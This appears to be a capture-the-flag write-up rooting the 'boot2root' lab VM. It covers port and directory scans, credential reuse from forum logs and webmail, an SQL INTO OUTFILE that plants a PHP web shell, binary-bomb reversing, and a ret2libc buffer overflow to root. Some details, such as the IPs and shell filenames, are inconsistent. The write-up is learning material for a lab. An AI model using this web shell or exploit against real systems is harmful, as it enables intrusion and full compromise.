1. VBoxManage guestproperty get <vmname> "/VirtualBox/GuestInfo/Net/0/V4/IP" (use Host-only networking in virtual machine settings).

	Value: 192.168.56.101

2. nmap 192.168.56.101

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 09:53 EET
Nmap scan report for 192.168.56.101
Host is up (0.00089s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

3. We use a software call Drib to scrap some of the most common url of the website.

```
git clone https://github.com/v0re/dirb.git (configure, make)
./dirb https://192.168.56.101/ wordlists/common.txt

run from dirb folder ./dirb  https://192.168.56.101  wordlists/common.txt -S > ../dirb-scan.txt

---- Scanning URL: https://10.12.1.150/ ----
+ https://10.12.1.150/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: https://10.12.1.150/forum/
==> DIRECTORY: https://10.12.1.150/phpmyadmin/
+ https://10.12.1.150/server-status (CODE:403|SIZE:293)
==> DIRECTORY: https://10.12.1.150/webmail/
```

### Forum

* After sneaking around and read all the forum post, we find a clue on the post "Probleme login ?" url = https://192.168.56.101/forum/index.php?id=6

* If your look for ```Failed password``` your will find one where the user is ```!q\]Ej?*5K5cy*AJ``` and we think that the user who tried to login make a mistake between are password and login

![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.05.14%20AM.png)

* We can see couple second after this attempt, lmezard successful login, so we can conclude the login is lmezard (Laurie Mezard)

* Use this credential to login the forum.

* Conclution we have one of the password and the email of lmezard.

* Get email info from user settings.

### Webmail

* On the webmail we have a login form, and we just find a password and a email in the forum section so we decided to give it a try.

![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.04.21%20AM.png)

* Login: ```laurie@borntosec.net```
* Password: ```!q\]Ej?*5K5cy*AJ```

* When we logged in , we find a email with the subject ```DB Access```


![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.06.32%20AM.png)

* Login: ```root```
* Password: ```Fg-'kKXBj87E:aJ$```
* we really suspect in the access for a DB

### Phpmyadmin

* We tried the credentials of the email to login phpmyadmin and it worcks :)
* After some research on the web we stumble on this [aritcle](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)
* The injection sql we are looking for is:
```select "<?php $cmd = $_REQUEST['cmd']; $output = shell_exec($cmd); echo $output  ?>" into outfile "/var/www/forum/templates_c/cl.php"```
https://192.168.56.101/forum/templates_c/cl.php?cmd=cat%20/home/LOOKATME/password
* Copy past this line and go to to => https://10.12.1.150/phpmyadmin/index.php on the sql tab
* After this step your just need to go to https://10.12.1.150/forum/templates_c/endTest0.php
* You will find ```lmezard:G!@M6f4Eatau{sF"```
* Login: ```lmezard```
* Password: ```G!@M6f4Eatau{sF"```

## Use the credentials

* Now we got the password of the server, we can try to log on the FTP service
* ftp [YOUR-IP-ADDRESS]
* login with  ```lmezard``` ```G!@M6f4Eatau{sF"```
* turn on passive mode
* get the fun file, see example bellow:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||25027|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||7488|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |****************************************************************************************************************************************|   790 KiB  127.07 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (120.03 MiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||44244|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>
```

## Using the fun file

* The fun file is actually an archive...

```
file fun
fun: POSIX tar archive (GNU)
```

* Decompressing it produces a new directory called "ft_fun".

```
tar xvf fun ; ls
ft_fun  fun  README
```

* "ft_fun" directory contains a fuck tone of files...
* We notice that each one of them is written in C language and its last line is tagged with a comment like so
//file3
//file235
...

* We can then make a little PHP script to read them and recompose the original C file, compile the file and execute it.

```
php pack.php && gcc main.c && ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

* If we sha256 this password we obtain :

```330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4```

* We can now connect with ssh as "laurie".
* ssh login: laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4


## ssh connection
* use  ``ssh laurie@192.168.56.101`` add use the password when it's ask

* Directory : /home/laurie/
-------------------------------------------------------------------------------

* Once connected with ssh as "laurie", let's find out where we are and what we have.

```
pwd ; ls
/home/laurie
README  bomb
```
* To crack the bomb binary we will use gdb as fuck...
* How yo use GDB http://www.bitforestinfo.com/2017/12/gdb-tutorials-debug-disassemble-c-programs-gdb-tutorial-in-ubuntu-part-one-buffer-overflow-exploitation-tutorial-reverse-engenering-programs-get-assemble-codes-of-binary-files-what-is-gdb-how-to-install-gdb-in-linux.html
* How to defuse bomb http://zpalexander.com/binary-bomb-lab-phase-1/
* For each step we will use the following command :

``` (gdb) disas phase_N```

### Phase 1 : "Public speaking is very easy."

* The address 0x80497c0 is pushed on the stack and contains the string "Public speaking is very easy.".
* The function strings_not_equal is called right after with 2 arguments, our input line and this string.
Obvious ...

### Phase 2 : "1 2 6 24 120 720"

* The function read_six_numbers expects 6 integers from input line separated by white spaces.
* It checks whether the 1st number is a 1.
* Then the next number must be the current number multiplied by the next position on the string.

```
1 at position 2 = 2
2 at position 3 = 6
6 at position 4 = 24
...
```
### Phase 3 : "1 b 214"

* The address 0x80497de is push on the stack before a call to sscanf and contains the string "%d %c %d".
* We need to pass 3 arguments according to sscanf format string.
[[ TO BE FINISHED ]]

### Phase 4 : "9"

* The address 0x8049808 is push on the stack before a call to sscanf and contains the string "%d".
* At 0x08048d1d, %eax register must be equal to 0x37.
* Within a few tries, we find the solution ...

### Phase 5 : "opekmq"

* The input string must be 6 bytes long and is compared to "giants" (0x804980b).
* At 0x08048d7b we find this string "isrveawhobpnutfg".
* If we compare it to the alphabet we can see the following pattern.

```
abcdefghijklmno
pqrstuvwxyz
```
----------------
isrveawhobpnutfg

* Meaning for example that 'a' => 's', 'b' => 'r', 'p' => 'i'...
* We just have to matches the right characters that translate to : "g i a n t s".

### Phase 6 : "4 2 6 3 1 5"

* Phase bonus :
	 Phase 4 : "9 austinpowers"
	 Secret phase: "1001"

* In the end the whole concatenated password is :
"Publicspeakingisveryeasy.126241207201b2149opekmq426315"

* But according to the forum, the characters at len-2 and len-3 must be switched, so to connect with ssh as "thor" we must use :
"Publicspeakingisveryeasy.126241207201b2149opekmq426135"

Directory : /home/thor/
-------------------------------------------------------------------------------

In this directory we find two files

```
ls
README  turtule
```

* The file turtule is actually a draw map for letters that gives us : SLASH
* It is said in the README to be used with 'zaz' user.
* Encrypting it in sha1-2-256 didn't work so we try in md5 and... it works !

```646da671ca01bb5d84dbb5fb2238dc8e```

* We can now connect with ssh as "zaz".

Directory : /home/zaz/
-------------------------------------------------------------------------------

In this directory we find

```
ls
exploit_me  mail
```
* If we open exploit_me into gdb we notice that we can use a buffer overflow at 140 bytes to overwrite the %eip register.

https://ru.wikipedia.org/wiki/%D0%9F%D0%B5%D1%80%D0%B5%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5_%D0%B1%D1%83%D1%84%D0%B5%D1%80%D0%B0

```./exploit_me $(python -c "print('A' * 140)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
* Since the file is root file, we can spwan a root shell with a ret2libc attack.
* We use gdb to find the address of system function, "/bin/bash" string and the idea is :
	- overwrite the %eip register with the system address from libc
	- put on the stack at %eip+8 the "/bin/sh" address

* Using python, that gives us :

```
./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```
# TADAM WE ARE ROOT !

